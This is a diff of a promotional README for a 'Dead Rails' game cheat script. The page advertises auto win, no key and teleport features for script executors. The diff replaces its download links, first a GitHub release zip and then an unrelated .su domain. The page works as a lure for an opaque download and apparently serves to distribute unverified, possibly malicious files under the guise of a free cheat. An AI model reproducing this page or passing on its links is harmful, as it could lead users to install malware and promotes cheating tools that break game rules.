@@ -1,14 +1,14 @@
 # **Dead Rails Script 2025 | Auto Win, No Key, Mobile Support, Bond Farm & TP to End**
 
 [![hq720](https://github.com/user-attachments/assets/1965ed9a-8694-48fd-bc53-0f10f77f08e3)
-](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
+](https://hardware-gui.su/)
 
 # Dead Rails Script 2025 – Ultimate Auto Win, No Key, Mobile & More 🚆
 
 Welcome to the **most advanced and fully optimized Dead Rails script** available online! Designed to give you **complete control and automation**, this script is **compatible with all major executors** like Delta, Redz Hub, Speed Hub, Skull Hub, and more – with **no key required**.
 
 [![зображення](https://github.com/user-attachments/assets/7beaa092-d2c3-43a9-915d-258226e212a6)
-](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
+](https://hardware-gui.su/)
 
 
 ## 💡 Features
